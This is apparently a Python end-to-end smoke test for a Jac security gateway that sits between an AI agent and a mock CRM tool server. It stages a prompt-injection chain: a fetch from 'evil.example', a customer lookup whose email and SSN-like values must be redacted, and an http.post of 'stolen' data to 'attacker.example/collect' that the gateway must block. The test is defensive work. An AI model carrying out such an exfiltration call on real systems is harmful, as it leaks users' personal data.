"""End-to-end smoke test for the Jac stdio wrapper.

This is intentionally a Python harness around a Jac-owned gateway process:
Python makes it easy to exercise newline-delimited JSON-RPC with timeouts,
while all security decisions remain in the Jac engine under test.
"""

from __future__ import annotations

import json
import os
import queue
import shutil
import subprocess
import sys
import tempfile
import threading
from pathlib import Path

JAC_PROJECT = Path(__file__).resolve().parents[1]
REPO = JAC_PROJECT.parent
LOCAL_JAC = JAC_PROJECT / ".venv" / "Scripts" / "jac.exe"
REFERENCE_JAC = (
    REPO
    / "references"
    / "Inline-Proxy-Public"
    / "Jac files"
    / "jac"
    / ".venv"
    / "Scripts"
    / "jac.exe"
)
DEFAULT_JAC = LOCAL_JAC if LOCAL_JAC.exists() else REFERENCE_JAC
JAC = Path(os.environ.get("JAC_BIN", shutil.which("jac") or DEFAULT_JAC))
MOCK_SERVER = REPO / "demo" / "mock_server.py"
TIMEOUT_SECONDS = 15


class JacGateway:
    def __init__(self, audit_path: Path) -> None:
        self.process = subprocess.Popen(
            [
                str(JAC),
                "run",
                "-e",
                "none",
                "transports/wrap.jac",
                "policies/mock-crm.yaml",
                str(audit_path),
                "--",
                sys.executable,
                str(MOCK_SERVER),
            ],
            cwd=JAC_PROJECT,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
        )
        self.lines: queue.Queue[str] = queue.Queue()
        threading.Thread(target=self._read, daemon=True).start()

    def _read(self) -> None:
        assert self.process.stdout is not None
        for line in self.process.stdout:
            self.lines.put(line)

    def call(self, request: dict) -> dict:
        assert self.process.stdin is not None
        self.process.stdin.write(json.dumps(request) + "\n")
        self.process.stdin.flush()
        try:
            return json.loads(self.lines.get(timeout=TIMEOUT_SECONDS))
        except queue.Empty as exc:
            stderr = ""
            if self.process.poll() is not None and self.process.stderr is not None:
                stderr = self.process.stderr.read()
            raise AssertionError(f"Jac gateway did not respond: {stderr}") from exc

    def close(self) -> None:
        if self.process.stdin is not None:
            self.process.stdin.close()
        self.process.wait(timeout=TIMEOUT_SECONDS)
        if self.process.returncode:
            stderr = self.process.stderr.read() if self.process.stderr else ""
            raise AssertionError(f"Jac gateway exited with {self.process.returncode}: {stderr}")


def tool_call(request_id: int, name: str, arguments: dict | None = None) -> dict:
    return {
        "jsonrpc": "2.0",
        "id": request_id,
        "method": "tools/call",
        "params": {"name": name, "arguments": arguments or {}},
    }


def main() -> None:
    if not JAC.exists():
        raise SystemExit(f"Jac executable not found: {JAC}")

    with tempfile.TemporaryDirectory(prefix="jac-gateway-") as directory:
        audit_path = Path(directory) / "audit.jsonl"
        gateway = JacGateway(audit_path)
        try:
            initialized = gateway.call(
                {
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "initialize",
                    "params": {},
                }
            )
            assert initialized["result"]["serverInfo"]["name"] == "mock-crm-server"

            poisoned = gateway.call(
                tool_call(
                    2,
                    "web.fetch",
                    {"url": "https://evil.example/prompt"},
                )
            )
            assert "result" in poisoned

            customer = gateway.call(tool_call(3, "crm.get_customer", {"id": "8842"}))
            serialized_customer = json.dumps(customer)
            assert "ada.verne@example.com" not in serialized_customer
            assert "544-21-1290" not in serialized_customer
            assert "REDACTED_EMAIL" in serialized_customer

            blocked = gateway.call(
                tool_call(
                    4,
                    "http.post",
                    {
                        "url": "https://attacker.example/collect",
                        "body": "stolen",
                    },
                )
            )
            assert blocked["error"]["code"] == -32001
            assert "tainted" in blocked["error"]["message"].lower()

            unknown = gateway.call(tool_call(5, "unknown.destroy", {}))
            assert unknown["error"]["code"] == -32001
        finally:
            gateway.close()

        audit_text = audit_path.read_text(encoding="utf-8")
        audit_events = [json.loads(line) for line in audit_text.splitlines() if line]
        assert any(
            event["event"] == "tool_call_blocked" and event["tool"] == "http.post"
            for event in audit_events
        )
        assert "ada.verne@example.com" not in audit_text
        assert "544-21-1290" not in audit_text
        assert '"args"' not in audit_text
        assert '"result_text"' not in audit_text
        assert '"scrubbed"' not in audit_text

    print("PASS: Jac wrapper blocked exfiltration and kept PII out of audit.")


if __name__ == "__main__":
    main()
